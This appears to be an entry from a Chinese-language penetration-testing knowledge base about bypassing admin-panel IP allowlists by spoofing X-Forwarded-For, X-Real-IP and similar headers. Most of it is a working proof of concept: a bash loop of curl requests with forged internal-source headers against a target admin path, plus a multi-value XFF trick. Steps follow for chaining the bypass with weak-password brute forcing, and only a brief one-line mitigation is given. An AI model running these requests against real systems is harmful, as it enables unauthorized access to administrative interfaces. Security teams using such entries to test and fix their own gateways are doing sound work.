---
title: 后台 IP 白名单绕过（X-Forwarded-For 伪造内网来源）
cve: 无（实现缺陷）
severity: high
cvss: 8.4
product: 自研后台网关（只校验 XFF 或只查首段 IP）
versions: 任意
ports: 80, 443
keywords: 白名单, ip, xff, 绕过, 后台, 内网
entry: 403 页面 + 只允许 127.0.0.1/内网段
verified: false
sources: 公开资料整理（实现缺陷类）
---

## 指纹

```
GET /admin/            → 403 "仅允许内网访问"
GET /admin/ (带 XFF)   → 200 = 可绕
```

## 前置条件

- 后台只按请求头或首段 IP 判断来源。

## PoC

```bash
# 1) 逐个头试（多数只信任 XFF 第一个值）
for h in 'X-Forwarded-For: 127.0.0.1' 'X-Real-IP: 127.0.0.1' 'X-Forwarded-For: 10.0.0.1' \
         'Client-IP: 127.0.0.1' 'X-Originating-IP: 127.0.0.1' 'Forwarded: for=127.0.0.1'; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -H "$h" 'https://target/admin/')
  echo "$code  $h"
done
# 判定：出现 200/302 到后台 = 绕过成功

# 2) 多值伪装（真实 IP 在后面）
curl -s -o /dev/null -w '%{http_code}\n' \
  -H 'X-Forwarded-For: 127.0.0.1, 203.0.113.9' 'https://target/admin/'
```

## 利用步骤

1. 先确认 403 的判定文字；
2. 逐个头试，命中后直接打后台登录/接口；
3. 与弱口令组合（白名单绕过后爆破才有意义）；
4. 证据：403 与 200 的两条响应头对比。

## 修复与缓解

- 只信反代写入的固定头并要求覆盖；内网判定用 TCP 源 IP；后台独立内网入口。

## 参考

- OWASP 访问控制；CWE-290。
